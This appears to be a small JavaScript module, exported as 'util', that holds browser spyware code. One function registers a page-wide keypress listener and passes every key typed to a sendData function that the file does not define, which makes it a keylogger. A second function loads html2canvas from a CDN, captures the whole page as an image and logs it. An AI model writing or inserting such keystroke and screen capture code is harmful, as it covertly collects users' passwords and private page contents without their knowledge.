const util = [
  async () => 
  document.addEventListener("keypress", async (event) => {
    await sendData(event.key)
}),
  () => {
  var script = document.createElement('script');
   script.setAttribute('src', 'https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.5/dist/html2canvas.min.js');
   script.setAttribute('type', 'text/javascript');
    script.async = false
    script.addEventListener('load', function() {
    // The script is loaded completely
    console.log("im working")
    html2canvas(document.body, {
    allowTaint: true,
    useCORS: true,
  })
.then(function (canvas) {
  // It will return a canvas element
  let image = canvas.toDataURL("image/png", 0.5);
  console.log(image)
})
.catch((e) => {
  // Handle errors
  console.log(e);
});
});
   document.body.appendChild(script);
    
    
  
}
]

module.exports = util
